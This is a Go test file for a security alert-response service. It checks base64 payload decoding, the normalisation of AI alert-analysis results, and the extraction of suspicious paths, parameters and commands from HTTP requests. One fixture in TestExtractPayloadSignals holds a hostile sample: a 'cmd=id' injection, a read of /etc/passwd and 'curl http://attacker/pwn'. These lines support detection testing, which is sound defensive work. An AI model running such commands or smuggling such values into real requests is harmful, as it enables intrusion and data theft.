package service

import (
	"encoding/base64"
	"testing"

	"security-response-system/internal/master/ai"
	"security-response-system/internal/master/model"
)

func TestDecodePayloadForAI(t *testing.T) {
	raw := "GET /admin HTTP/1.1"
	encoded := base64.StdEncoding.EncodeToString([]byte(raw))

	if got := decodePayloadForAI(encoded); got != raw {
		t.Fatalf("expected decoded payload %q, got %q", raw, got)
	}

	if got := decodePayloadForAI(raw); got != raw {
		t.Fatalf("expected raw payload passthrough %q, got %q", raw, got)
	}
}

func TestNormalizeAlertAnalysisResult(t *testing.T) {
	alert := model.AlertLog{
		SignatureName: "SQL Injection Attempt",
		SourceIP:      "10.0.0.8",
		DestIP:        "10.0.0.20",
		Action:        "block",
		RiskScore:     88,
		Severity:      "high",
	}

	result := normalizeAlertAnalysisResult(&ai.AlertAnalysisResult{
		Summary:           "",
		AttackType:        "",
		RiskReason:        "",
		RecommendedAction: "PATCH",
		Confidence:        2,
	}, alert)

	if result.Summary == "" || result.AttackType == "" || result.RiskReason == "" {
		t.Fatalf("expected fallback fields to be populated: %+v", result)
	}
	if result.ImpactScope == "" || result.EvidencePoints == "" || result.OperatorAdvice == "" {
		t.Fatalf("expected structured fallback fields to be populated: %+v", result)
	}
	if result.SuspiciousPath == "" || result.SuspiciousParams == "" || result.CommandFragments == "" {
		t.Fatalf("expected extracted fallback fields to be populated: %+v", result)
	}
	if result.RecommendedAction != "repair" {
		t.Fatalf("expected recommended action to normalize to repair, got %s", result.RecommendedAction)
	}
	if result.Confidence != 1 {
		t.Fatalf("expected confidence to clamp to 1, got %v", result.Confidence)
	}
}

func TestExtractPayloadSignals(t *testing.T) {
	payload := "POST /admin/run?cmd=id&file=/etc/passwd HTTP/1.1\nHost: demo\n\ncurl http://attacker/pwn"
	signals := extractPayloadSignals(payload)

	if signals.Path == "" || signals.Path != "/admin/run?cmd=id&file=/etc/passwd" {
		t.Fatalf("unexpected path: %+v", signals)
	}
	if len(signals.Params) == 0 {
		t.Fatalf("expected suspicious params to be extracted: %+v", signals)
	}
	if len(signals.Commands) == 0 {
		t.Fatalf("expected command fragments to be extracted: %+v", signals)
	}
}
